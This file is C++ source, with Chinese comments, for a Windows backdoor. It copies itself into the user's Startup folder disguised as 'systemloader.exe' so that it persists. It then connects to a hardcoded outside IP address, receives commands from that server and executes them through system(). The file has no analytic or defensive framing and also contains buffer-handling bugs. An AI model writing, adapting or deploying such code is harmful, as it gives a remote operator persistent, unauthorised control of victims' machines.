#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <bits/stdc++.h>

#define SERVER_IP "180.101.45.182"
#define SERVER_PORT 17967

static SOCKET clientSocket = INVALID_SOCKET;
static bool isConnected = false;
const char* start = "start";

//拼接字符串 
std::string mergeStrings(const char* str1, const char* str2) {
    if (!str1) str1 = "";
    if (!str2) str2 = "";
    return std::string(str1) + str2; // 直接拼接
}

//服务器连接
bool ConnectToServer() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }
    isConnected = true;
    return true;
} 

void handleClient(SOCKET client) {
    char buffer[1024];
    while(true) {
        int received = recv(client, buffer, sizeof(buffer), 0);
        if(received <= 0) break;
        buffer[received] = '\0';
    	std::string html = buffer;
        std::string sub = html.substr(5);
        std::string open = "start " + sub;
    	system(open.c_str());
    }
}

void HKRunator(char *programName)
{
	char* username;
    char destinationPath[MAX_PATH];
	username = getenv("USERPROFILE");
	snprintf(destinationPath, sizeof(destinationPath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemloader.exe", username);
	CopyFileA(programName, destinationPath, FALSE);
}

int main()
{
	char szSelfName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    HKRunator(szSelfName);
    if (ConnectToServer()) {
        printf("Connected to server\n");
        char buffer[1024];
    	int bytesReceived;
	        while (isConnected) {
	        	handleClient(clientSocket);
        	}
        buffer[bytesReceived] = '\0';
        std::cout << "Received: " << buffer << std::endl;
    }else {
        printf("Connection failed\n");
    }
    WSACleanup(); 
}
